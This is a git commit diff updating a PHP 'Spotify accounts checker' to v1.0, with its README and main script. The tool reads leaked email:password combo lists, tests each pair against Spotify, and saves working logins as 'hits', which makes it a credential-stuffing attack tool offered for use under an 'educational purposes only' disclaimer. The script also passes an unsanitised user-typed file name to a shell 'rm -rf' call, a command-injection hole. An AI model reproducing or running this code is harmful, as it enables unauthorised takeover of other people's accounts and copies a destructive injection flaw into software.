ecce7a3694dbe2bca3c2ff60cde7e3e886d0e71c
Voldemort <nflix.vol@gmail.com>
2019-03-13 21:09:38 +0530

    Updated to v1.0

--- README.md
+++ README.md
@@ -3,28 +3,30 @@
 - ~~Mass Spotify Accounts Checker v0.2 (Updated on 19/02/2019 17.35 IST)~~
 - ~~Mass Spotify Accounts Checker v0.2.1 (Updated on 20/02/2019 19.23 IST)~~
 - ~~Mass Spotify Accounts Checker v0.2.2 (Updated on 21/02/2019 14.00 IST)~~
-- Mass Spotify Accounts Checker v0.3 (Updated on 22/02/2019 00.50 IST)
-## v0.4 Dropping Soon!
-## For Educational Purposes Only!! xD
+- ~~Mass Spotify Accounts Checker v0.3 (Updated on 22/02/2019 00.50 IST)~~
+- Mass Spotify Accounts Checker v1.0 (Update on 13/03/2019 2200 IST)
+
+## For Educational Purposes Only!!
+#### I Will Not be Responsible for Any Kind of Problems That Arise due to Unfair Usage!!
 ###### P.S. You Know What I Mean! xD
-## Alpha Release Notes!!
-* ~~The email:password combo type is Still Under Development!~~
-* Completely Functional
-* ~~Code Optimisation and~~ 
-Formatting/Processing of Output is Pending!
+
+## v1.0 Release Notes!!
+* Completely Functional!!
 * Report any Bugs at https://t.me/hewhomustn0tbenamed (Telegram)
 * Join the Group at https://t.me/VoldemortCommunity (Telegram)
 * Enjoy!!
 
-## To-Do
-
-* ~~Create Banner~~
-* ~~Add email:password Combo Support~~
-* Parse Output
-* Colourise Output
-* Add Functionality to Store Output as .txt File
-
 ## Changelog
+
+### v1.0
+* ***v1.0 is Out Now!!***
+* **Colourised Output!! Hits are now GREEN!!** 
+* **Added Functionality to** ***Save Hits!!***
+* ***Added Updater!!*** Automatically Check for Updates Before Each Run!!
+* Added Automatic Configuration & Dependencies Installation on First Run!!
+* Removed Username:Password Combo Type as it was Obsolete
+* Some Under-The-Hood Changes..UI Tweaks & Performance Upgrades!!
+
 ### v0.3
 * ***Added Email:Password Combo!!***
 * Reverted to 'echo' for Banner as Most Dickheads don't have 'figlet' installed!
@@ -44,7 +46,7 @@ Formatting/Processing of Output is Pending!
 ### @voldemort1912!🖖🏻
 
 ## HOW TO USE!!
-* Open a Terminal Run `pkg install git && pkg install curl && pkg update`
+* Open a Terminal & Run `pkg install git && pkg install curl && pkg update`
 * Next, Run `git clone https://github.com/VoldemortCommunity/SpotifyChecker`
 * Navigate to the Newly Created SpotifyChecker Directory using `cd SpotifyChecker`
 * The Program has Now been Installed and Can be Run!!
@@ -52,6 +54,27 @@ Formatting/Processing of Output is Pending!
 * Follow the Instructions!
 * Make Sure you move the Combo File to the Same Directory as the Checker!
 * Peace!🖖🏻
+
+## To-Do
+
+* ~~Create Banner~~
+* ~~Add email:password Combo Support~~
+* ~~Parse Output~~
+* ~~Colourise Output~~
+* ~~Add Functionality to Store Output as .txt File~~
+* ~~Add Updater~~
+* User Defined Customization!!
+
+### Issues?
+
+* Report Them on GitHub!!
+* Contact Support : https://t.me/VoldemortCommunity (Telegram)
+
+### Feature Requests & Feedback
+
+* Contact Me : https://t.me/VoldemortCommunity (Telegram)
+* Mail Me : Voldemort1912@hackermail.com
+
 #### Have Questions?
 * Join the Conversation at https://t.me/VoldemortCommunity !!
 * DM me @Voldemort1912 !!
--- checker.php
+++ checker.php
@@ -9,74 +9,154 @@
 
 // DO NOT MODIFY!! I WILL NOT BE RESPONSIBLE FOR ANY KIND OF MODIFICATIONS WHICH HINDER THE FUNCTIONABILITY OF THE PROGRAM!!!
 
-echo "\033[01;31m
-    ### #####  #####  ###### ##  ##### ###  ##    ##### ##  ##  #####  ##### ##  ## ##### ######   ## ##
-   ##       ##     ##   ##   ##  ##    ###  ##   ##     ##  ##  ##    ##     ## ##  ##    ##   ##  ## ##
-   ##   ##### ##   ##   ##   ##  ##### #######   ##     ######  ##### ##     ####   ##### #####    ## ##
-   ##   ##    ##   ##   ##   ##  ##        ###   ##     ##  ##  ##    ##     ## ##  ##    ##  ##
- ###    ##     ####     ##   ##  ##        ###    ##### ##  ##  #####  ##### ##  ## ##### ##   ### ## ## v0.3\033[0m";
- 
-//echo "\033[01;31m ";
-//system('figlet -f big -c SpotifyChecker!!');
-//echo "v0.22\033[0m";
+//FIRST RUN (Install Dependencies)
+if (is_file(".first")){
+	$firstrun = file_get_contents('.first');
+}else{
+	$firstrun = true;
+}
+if ($firstrun == 'true'){
+	echo "\033[01;32;1m[i] First Run Detected... Installing Dependencies.....";
+	echo "\n[i] This Might Take a While! PLEASE DO NOT EXIT THE PROGRAM!...\n";
+	sleep(1);
+	echo "[#####";
+	sleep(2);
+	echo "##";
+	sleep(1);
+	echo "###";
+		system('apt install curl python python2 figlet -y > /dev/null 2> /dev/null');
+	for ($i=0; $i<15; $i++){
+		echo "#"; 
+		sleep(1);
+	};
+	echo "]";
+	sleep(3);
+	echo "\n[i] The Dependencies Have Been Installed Successfully!!";
+	echo "\n[i] The Program has Been Installed Successfully!";
+	echo "\n[i] Please Restart the Program to See the Changes";
+	echo "\n[i] Press Enter to Exit...";
+	fgetc(STDIN);
+	file_put_contents('.first','false');
+	exit;
+	}
+
+
+echo "\033[01;31m";
+system("figlet -c 'Spotify Checker'");
+echo"\033[0m";
+sleep(2);
 echo "\n\n
-\033[01;31m[•]\033[09;31mv0.1v0.2\033[0m\033[01;31mv0.3 Developed by \033[01;32;1m@hewhomustn0tbenamed\033[01;31m (Telegram).\033[0m\n Press Enter to Continue...\n";
-fgetc(STDIN);
-echo "\033[01;31m\n[•]You're Responsible For your Actions. Use Wisely.
-[•]Join \033[01;32;1m@VoldemortCommunity (Telegram)\033[01;31m for More!.
-[•]Huge Thanks to @DrWean for His Outdated GitHub Repo.
-[•]Thank You to all the Testers!! and StackOverflow.
-\033[0m";
+\033[01;31m[•]\033[09;31mv0.1v0.2v0.3\033[0m\033[01;31mv0.4 Developed by \033[01;32;1m@hewhomustn0tbenamed\033[01;31m (Telegram).\n";
+sleep(3);
+echo "\033[01;31m[•]You're Responsible For your Actions. Use Wisely.\n";
+sleep(1);
+echo "[•]Join \033[01;32;1m@VoldemortCommunity (Telegram)\033[01;31m for More!.\n";
+sleep(0.8);
+echo "[•]Huge Thanks to @DrWean for His Outdated GitHub Repo.\n";
+sleep(0.8);
+echo "[•]Thank You to all the Testers!! and StackOverflow.\n\033[0m";
+sleep(2);
 include ('class.spotify.php');
 
-echo "\n\033[51;33;1m[i]Are You Sure You Want To Do This?  Type \033[01;32;1m'yes'\033[51;33;1m to Continue :\033[0m ";
-$handle3 = fopen("php://stdin", "rb");
-$ln = fgets($handle3);
-
-if (trim($ln) == 'yes') {
-	echo "\n\033[01;32;1m[i]Enter Combo List Name : \033[0m";
-	$handle1 = fopen("php://stdin", "r");
-	$inpnam = fgets($handle1);
-	$lines = file(trim($inpnam));
-	echo "\n \n\033[01;32;1m[i]Enter Combo List Type:\n \n[1] Username:Password\n \n[2] Email:Password\n \nResponse[1/2]:\033[0m ";
-	$comtype = fgets(fopen("php://stdin", "r"));
-	echo "Press Enter to Continue...";
-	fgetc(STDIN);
-	system('clear');
-
-	//    echo "n\033[01;32;1m[i]Let's Begin...n";
-	//    echo "\033[51;\033;1m[i]Press Ctrl+C or Tap and Hold ~> More ~> Kill Process to Exit before The Execution Completes!\033[0mnnn";
-
-	/*if (trim($comtype) == '1') {*/
-		echo "\n\033[01;32;1m[i]Let's Begin...\n";
-		echo "\033[51;033;1m[i]Press Ctrl+C or Tap and Hold ~> More ~> Kill Process to Exit before The Execution Completes!\033[0m\n\n\n";
-
-		// echo $comtype."1";
-
-		$spotify = new spotify();
-		foreach((array) $lines as $line) {
-			$var = explode(':', $line);
-			$usernn = trim($var[0]);
-			$inppass = trim($var[1]);
-			$res = $spotify->check($usernn, $inppass, $comtype);
-			echo "[!]Username : " . $usernn . "\n";
-			echo "[!]Password : " . $inppass . "\n";
-			echo "[!]" . $res . "\n\n";
-		}
-	/*}
-	else
-	if (trim($comtype) == '2') {
-
-		// echo $comtype."2";
-
-		echo "\033[05;33;1mCOMING SOON!!!\nThe Program will Now Exit!!\nPress Enter to Continue...\033[0m";
+//Check Updates
+$glo_ver = trim(file_get_contents('https://raw.githubusercontent.com/VoldemortCommunity/SpotifyChecker/master/.version'));
+$loc_ver = trim(file_get_contents('.version'));
+if($glo_ver > $loc_ver){
+	echo "\033[01;32;1m[i] Update Available!!\n";
+	$changes = file_get_contents("https://raw.githubusercontent.com/VoldemortCommunity/SpotifyChecker/master/.changelog");
+	echo "[i] Changelog : \n".$changes;
+	sleep(5);
+	echo "\n\033[51;33;1m[i] Do you Want to Update to v".$glo_ver."?? Type \033[01;32;1m'yes'\033[51;33;1m to Continue :\033[0m ";
+	$updatehandle = fopen("php://stdin", "rb");
+	$ln = fgets($updatehandle);
+	if (trim($ln) == 'yes'){
+		echo "\033[05;32;1m[i] Updating Now...\n[i] Press Enter to Start...\033[0m";
+		fgetc(STDIN);
+		system('git reset --hard');
+		system('git pull origin master');
+		echo "\033[01;32;1m[i] Update Complete!! Please Restart to see Changes!!";
+		echo "\n[i] Press Enter to Continue...";
 		fgetc(STDIN);
 		exit;
-	}*/
+	}
+} else {
+	echo "[i] You're Already on the Latest Version!! Cheers!";
 }
-else {
-	echo "\033[05;31mABORTING....\nThe Program will Now Exit!!\nPress Enter to Continue...\033[0m";
+
+//Warning
+echo "\n\033[51;33;1m[i]Are You Sure You Want To Do This?  Type \033[01;32;1m'yes'\033[51;33;1m to Continue :\033[0m ";
+$warnhandle = fopen("php://stdin", "rb");
+$ln = fgets($warnhandle);
+if (trim($ln) !== 'yes'){
+	echo "\033[05;31m[i]ABORT.\n[i]The Program will Now Exit!!\n[i]Press Enter to Continue...\033[0m";
 	fgetc(STDIN);
 	exit;
 }
 
+//Get ComboList
+echo "\n\033[01;32;1m[i]Enter Combo List Name : \033[0m";
+$combohandle = fopen("php://stdin", "r");
+$inpnam = trim(fgets($combohandle));
+if(strpos($inpnam, ".txt") == false){
+	$inpnam .= ".txt";
+}
+if(!is_file($inpnam)){
+	echo "\n\033[05;31m[i]ABORT.\n[i]The File ".$inpnam." does Not Exist!!\n[i]The Program will Now Exit!!\n[i]Press Enter to Continue...\033[0m";
+	fgetc(STDIN);
+	exit;
+}
+$lines = file(trim($inpnam));
+
+//get ComboList Type
+echo "\n \n\033[01;32;1m[i]Enter Combo List Type:\n \n[1] Email:Password\n \n[2] Username:Password\n \nResponse[1/2]:\033[0m ";
+$comtype = fgets(fopen("php://stdin", "r"));
+if (trim($comtype) == '2'){
+	echo "\n\033[05;31m[i]ABORT.\n[i]This Feature Has Been Discontinued.\n[i]Contact \033[01;32;1m@hewhomustn0tbenamed\033[01;31m (Telegram) for Details.\n[i]The Program will Now Exit!!\n[i]Press Enter to Continue...\033[0m";
+	fgetc(STDIN);
+	exit;
+}
+
+//Saving Hits
+echo "\n\033[51;33;1m[i] Enter File Name to Save Hits : \033[0m";
+$handle3 = fopen("php://stdin", "rb");
+$file = trim(fgets($handle3));
+if(strpos($file, ".txt") == false){
+	$file .= ".txt";
+}
+system('rm -rf '.$file);
+file_put_contents($file, "[#] Spotify Checker v0.4\n[#] Made by @hewhomustn0tbenamed (Telegram)\n[#] GitHub: https://github.com/VoldemortCommunity\n\n[#] Feeling Generous? Donate: 3QheChfSnPqBVBsnm1DFYg9xoHQmbnXP6d [BTC]\n\n\n");
+
+$count = 0;
+$combocount = 0;
+//Starting
+echo "Press Enter to Continue...";
+fgetc(STDIN);
+	
+echo "\n\033[01;32;1m[i]Let's Begin...\n";
+echo "\033[51;033;1m[i]Press Ctrl+C or Tap and Hold ~> More ~> Kill Process to Exit before The Execution Completes!\033[0m\n\n\n";
+
+$spotify = new spotify();
+foreach((array) $lines as $line) {
+	$var = explode(':', $line);
+	$usernn = trim($var[0]);
+	$inppass = trim($var[1]);
+	$res = $spotify->check($usernn, $inppass, 2);
+	$dec = json_decode($res, true);
+	if($dec["status"]==true){
+		$count++;
+		echo "\033[01;32;1m";
+		file_put_contents($file, "[!]Email ID : ".$usernn."\n[!]Password : ".$inppas."\n[i]SpotifyChecker by @hewhomustn0tbenamed (Telegram)!!\n[!]".$res."\n\n", FILE_APPEND);
+	} else {
+		echo "\033[01;31m";
+	}
+	echo "[!]Username : " . $usernn . "\n"; 
+	echo "[!]Password : " . $inppass . "\n";
+	echo "[!]" . $res . "\n\n\033[0m";
+	$combocount++;
+}
+
+//End Program
+echo "\n\n\n\033[01;32;1m[i] The Program has Executed Successfully!!\n[i] Combos Checked : ".$combocount."\n[i] Hits Found : ".$count."\n[i] Hits have been Saved to ".$file."\n[i] Spotify Checker by @hewhomustn0tbenamed!!\n\n      PEACE!!🖖\n ";
+echo "\n\033[0m[i] Press Enter to Continue!! ";
+fgetc(STDIN);
+exit;
